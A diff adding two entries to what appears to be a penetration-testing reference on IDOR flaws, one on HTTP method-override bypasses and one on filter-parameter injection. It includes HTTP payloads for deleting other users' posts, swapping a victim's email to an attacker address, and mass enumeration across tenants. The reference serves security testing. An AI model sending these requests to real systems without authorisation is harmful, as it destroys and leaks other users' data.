@@ -2656,3 +2656,112 @@ DELETE /api/credentials/{id}      ← does response include the credential?
 POST   /api/tokens/{id}/reset     ← does response echo old + new token?
 ```
 **Source:** https://github.com/baptisteArno/typebot.io/security/advisories/GHSA-grx8-g27p-8hpp (CVE-2025-64706)
+
+---
+
+## IDOR via X-HTTP-Method-Override
+**Reference type:** Any (numeric / GUID / hash)
+**API pattern:** REST
+**Authorization flaw:** Many REST frameworks support HTTP method override via `X-HTTP-Method-Override`, `X-Method-Override`, `X-HTTP-Method` headers, or `_method` POST body parameter. The framework executes the override method. ACL middleware that evaluates access based on the actual HTTP method (e.g., allowing GET but blocking DELETE) doesn't apply the DELETE check when the request arrives as GET + override header — the outer method passes the ACL check while the inner override executes the privileged operation on the target object.
+**Escalation:** Horizontal / Vertical
+**Business impact:** Delete, modify, or replace another user's resources using a GET or POST that bypasses method-specific ACL rules. Particularly effective when firewalls or WAFs block DELETE/PUT/PATCH but allow GET.
+**Test payload:**
+```http
+# Baseline: DELETE blocked by ACL for non-owner
+DELETE /api/users/1002/posts/5001 HTTP/1.1
+Authorization: Bearer <your-token>
+→ 403 Forbidden
+
+# Method override via header — ACL sees GET, framework executes DELETE:
+GET /api/users/1002/posts/5001 HTTP/1.1
+Authorization: Bearer <your-token>
+X-HTTP-Method-Override: DELETE
+→ 200 OK (post deleted — ACL checked GET permission, DELETE executed)
+
+# Try all override header variants:
+X-HTTP-Method-Override: DELETE
+X-Method-Override: DELETE
+X-HTTP-Method: DELETE
+
+# POST body parameter override (Rails/Laravel pattern):
+POST /api/users/1002/posts/5001 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+_method=DELETE
+
+# Modify another user's data via hidden PUT:
+POST /api/users/1002/profile HTTP/1.1
+Content-Type: application/json
+X-HTTP-Method-Override: PUT
+Authorization: Bearer <your-token>
+{"email": "attacker@evil.com"}
+
+# Frameworks that support method override:
+# Rails (ActionDispatch)          → _method form body
+# Express (method-override npm)   → X-HTTP-Method-Override header
+# Laravel                         → X-HTTP-Method-Override or _method
+# Spring Boot (HiddenHttpMethodFilter) → _method
+# Django REST Framework           → HTTP_X_HTTP_METHOD_OVERRIDE
+
+# Detection:
+# 1. OPTIONS /api/resource → check Allow header for DELETE/PUT/PATCH
+# 2. Try the restricted method directly → note 403
+# 3. Retry as GET + X-HTTP-Method-Override: <blocked_method>
+```
+**Source:** https://portswigger.net/web-security/access-control
+
+---
+
+
+---
+
+## IDOR via Search / Filter Parameter Injection
+**Reference type:** Numeric / String (query filter value)
+**API pattern:** REST / GraphQL
+**Authorization flaw:** Search and filter APIs expose parameters such as `filter[owner_id]`, `search[user_id]`, `q=author:X`, `assigned_to=Y`, or `created_by=Z` that control which user's data is returned. The backend queries the database using these values directly without enforcing that the filter scope matches the authenticated session. An authenticated attacker substitutes another user's ID in a filter parameter and receives a full unauthorized data dump in a single API response.
+**Escalation:** Horizontal / Tenant isolation
+**Business impact:** Mass exfiltration of any user's complete object collection (tasks, tickets, orders, documents) via a single filtered request. Unlike single-object IDOR, filter injection returns all matching objects in one response. Particularly severe in multi-tenant SaaS where `org_id` or `tenant_id` substitution returns competitor data.
+**Test payload:**
+```http
+# Normal search (your own data):
+GET /api/tickets?filter[user_id]=1001&status=open HTTP/1.1
+Authorization: Bearer <your-token>
+→ Returns your 12 open tickets
+
+# Filter injection — substitute victim's user_id:
+GET /api/tickets?filter[user_id]=1002&status=open HTTP/1.1
+Authorization: Bearer <your-token>
+→ If returns user 1002's tickets → mass IDOR confirmed
+
+# Common filter parameter patterns to test:
+GET /api/orders?created_by=1002
+GET /api/documents?owner=user_1002
+GET /api/tasks?assigned_to=1002&project_id=PRJ-001
+GET /api/messages?sender_id=1002
+GET /api/reports?org_id=competitor-org-id       ← tenant IDOR
+GET /api/audit_logs?actor_id=1002               ← another user's action history
+
+# JSON:API filter syntax (Rails/Ember apps):
+GET /api/posts?filter[author.id]=1002
+GET /api/files?filter[uploaded_by]=user:1002
+
+# GraphQL where-clause filter IDOR:
+query {
+  tickets(where: { userId: { eq: "1002" } }) {
+    id title priority assignee { email }
+  }
+}
+
+# Elasticsearch filter injection via search API:
+POST /api/search HTTP/1.1
+Content-Type: application/json
+{"query": {"term": {"user_id": "1002"}}, "size": 1000}
+→ Returns all of user 1002's indexed documents
+
+# Range sweep for mass enumeration:
+GET /api/orders?filter[user_id][gte]=1&filter[user_id][lte]=9999
+
+# High-priority filter params to test:
+# user_id, owner, creator, author, assigned_to, submitted_by,
+# created_by, updated_by, tenant_id, org_id, company_id, account_id
+```
+**Source:** https://owasp.org/www-project-top-ten/2021/A01_2021-Broken_Access_Control; https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References
